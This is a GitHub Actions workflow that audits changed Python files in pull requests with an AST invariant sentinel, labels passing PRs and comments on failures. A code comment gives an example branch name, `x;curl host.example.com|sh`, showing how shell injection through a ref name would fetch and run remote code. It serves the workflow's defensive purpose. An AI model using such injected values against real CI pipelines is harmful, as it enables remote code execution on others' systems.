name: PR Architectural Sentinel & Invariant Gate

on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: read
  pull-requests: write
  issues: write

jobs:
  audit-diff:
    name: Audit PR Invariants
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Repository
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
        with:
          fetch-depth: 0

      - name: Set up Python
        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7
        with:
          python-version: "3.12"

      - name: Extract Changed Python Files
        id: changed-files
        env:
          # Never interpolated into the shell. Git permits `;`, `$`, `(`, `)`, `|` and
          # backticks in a ref name, so a branch called `x;curl host.example.com|sh` would
          # become two commands here. Actions substitutes expressions before bash parses
          # anything; reading the value from the environment removes that path entirely,
          # which is the rule `autonomous-triage.yml` already applies to an issue body.
          BASE_REF: ${{ github.base_ref }}
        run: |
          git diff --name-only "origin/${BASE_REF}...HEAD" | grep '\.py$' > /tmp/changed_py_files.txt || true
          echo "files_count=$(wc -l < /tmp/changed_py_files.txt)" >> "$GITHUB_OUTPUT"
          cat /tmp/changed_py_files.txt

      - name: Run Sentinel on Changed Files
        id: sentinel
        # Deliberately unconditional. Guarding this on `files_count > 0` meant a
        # documentation-only pull request skipped the audit and still reached
        # `if: success()` below, which applied a `certified-by-sentinel` label to work the
        # sentinel had never looked at — Observation 11's failure mode, in the workflow
        # named after the sentinel. The step now always runs and states what it audited.
        run: |
          # Deleted paths are filtered out; the sentinel fails on targets that no longer exist.
          while IFS= read -r py_file; do
            [ -f "$py_file" ] && printf '%s\n' "$py_file"
          done < /tmp/changed_py_files.txt > /tmp/existing_py_files.txt

          VIOLATIONS=0
          if [ -s /tmp/existing_py_files.txt ]; then
            # One consolidated audit: the sentinel accepts N paths and reports every violation.
            xargs -r -a /tmp/existing_py_files.txt python examples/ast-invariant-sentinel/sentinel.py || VIOLATIONS=1
          else
            echo "No Python files changed in this pull request; nothing for the sentinel to audit."
          fi

          echo "total_violations=${VIOLATIONS}" >> "$GITHUB_OUTPUT"
          if [ "${VIOLATIONS}" -gt 0 ]; then
            echo "❌ Architectural invariant violations detected!"
            exit 1
          fi

      - name: Apply Certified Label on Success
        # A fork pull request runs with a read-only `GITHUB_TOKEN` whatever `permissions:`
        # declares, so this step fails for every outside contributor -- turning their first
        # contribution red for a labelling courtesy that has nothing to do with their change.
        # The audit above is the gate; the label is decoration, and decoration must not fail
        # a build. Skipped rather than `continue-on-error` so the reason is stated.
        if: success() && github.event.pull_request.head.repo.full_name == github.repository
        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            await github.rest.issues.addLabels({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.payload.pull_request.number,
              labels: ['certified-by-sentinel']
            });

      - name: Post Feedback on Invariant Failure
        if: failure()
        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            const comment = `### 🛡️ Architectural Sentinel: Invariant Violation
            
            This pull request contains code changes that violate non-negotiable architectural invariants:
            - **Cyclomatic Complexity**: Must be $\\le 10$ per function.
            - **Nesting Depth**: Must be $\\le 5$ levels.
            - **Zero-Trust Egress**: Private RFC 1918 IPs and non-standard mock domains are prohibited.
            
            Please run the local sentinel before re-submitting:
            \`\`\`bash
            python examples/ast-invariant-sentinel/sentinel.py <file>
            \`\`\`
            `;

            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.payload.pull_request.number,
              body: comment
            });
